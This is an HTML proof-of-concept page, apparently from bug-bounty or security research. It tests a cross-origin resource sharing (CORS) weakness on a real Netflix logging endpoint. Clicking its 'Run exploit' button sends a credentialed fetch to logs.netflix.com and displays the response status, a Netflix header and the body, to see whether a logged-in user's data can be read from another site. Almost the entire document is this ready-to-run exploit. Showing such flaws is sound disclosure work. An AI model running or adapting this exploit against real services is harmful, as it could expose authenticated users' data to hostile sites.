<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8" />
<title>Netflix CORS PoC – logs endpoint</title>
<style>
  body{font-family:monospace;background:#111;color:#eee;padding:2rem}
  button{padding:.5rem 1rem;font-size:1rem;cursor:pointer}
  pre{background:#222;border-radius:6px;padding:1rem;max-height:420px;overflow:auto}
</style></head>
<body>
<h2>Netflix CORS PoC – <code>/log/www/cl/2</code></h2>
<button onclick="poc()">Run exploit</button>
<pre id="out">Click the button…</pre>

<script>
async function poc(){
  const out=document.getElementById('out');
  out.textContent='⏳ Sending GET…';
  try{
    const res=await fetch(
      'https://logs.netflix.com/log/www/cl/2?dummy=1',
      {credentials:'include'}
    );
    const txt=await res.text();
    out.textContent=
`Status   : ${res.status}
nfstatus : ${res.headers.get('x-netflix.nfstatus')}

${txt || '(empty body – read cross‑origin)'}`;
  }catch(e){
    out.textContent='❌ Blocked:\n'+e;
  }
}
</script>
</body></html>
